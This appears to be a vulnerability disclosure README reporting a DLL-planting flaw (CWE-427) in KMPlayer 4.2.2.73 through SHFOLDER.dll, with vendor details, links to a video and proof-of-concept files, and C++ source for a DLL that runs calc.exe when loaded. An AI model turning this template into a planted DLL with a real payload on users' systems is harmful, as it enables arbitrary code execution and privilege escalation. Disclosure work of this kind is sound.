# KMPlayer_Poc

## Vendor of the product
PandoraTV.

## The name of an affected Product
KMPlayer x32

## Affected version
KMPlayer_4.2.2.73(Latest)

## Product address: 
https://www.kmplayer.com/pc

## Description
KMPlayer  was discovered to contain a DLL hijacking vulnerability that allows attackers to escalate privileges and execute arbitrary code via a crafted DLL.

## Affected component
SHFOLDER.dll

## Vulnerability type
CWE-427: Uncontrolled Search Path Element

## DLL planting vulnerability type
Current Working Directory (CWD) DLL planting 

## POC video
[![KMPlayer poc](https://youtu.be/7bh2BQOqxFo)

## POC files download
https://drive.google.com/file/d/1bdYaDmtWhnjaHkzv3bZ4PUSMzDJ8JjSV/view?usp=sharing
```bash
kmp32# tree
.
├── KMPlayer_4.2.2.73.exe
├── KMPlayer_poc.mp4
└── SHFOLDER.dll

```

## Poc source code
```C++
// dllmain.cpp
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
